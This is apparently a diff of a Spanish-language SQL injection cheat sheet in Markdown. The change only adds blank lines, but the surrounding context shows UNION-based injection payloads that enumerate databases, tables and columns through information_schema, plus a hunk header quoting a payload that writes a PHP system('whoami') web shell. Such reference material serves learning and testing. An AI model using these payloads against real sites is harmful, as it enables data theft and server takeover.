@@ -46,6 +46,7 @@ SELECT password,email FROM users WHERE id=1 UNION SELECT "<?php system('whoami')
   <img src="https://i.postimg.cc/1X0nT1WV/load-file-sql.png" alt="sql"/>
 </p>
 ---
+
 + **Recupera las bases de datos disponibles en el servidor - LISTAR DBS**
 ```sql
 //Ejemplo por consola
@@ -56,6 +57,7 @@ SELECT username,password FROM users WHERE category=Accessories' UNION SELECT use
 ' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
 ```
 - **Recupero "todas" las tablas creadas en cada base de datos. - LISTAR TABLAS**
+
 ```SQL
 //Esto va en la URL
 ' UNION SELECT table_name,NULL FROM information_schema.tables-- -
@@ -64,6 +66,7 @@ SELECT username,password FROM users WHERE category=Accessories' UNION SELECT use
 <p align="center">
   <img src="https://i.postimg.cc/7ZT8y18D/tabla-y-dbs.png" alt="sql"/>
 </p>
+
 ```sql
 SELECT username,password FROM users WHERE category=Accessories' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'-- -
 ```
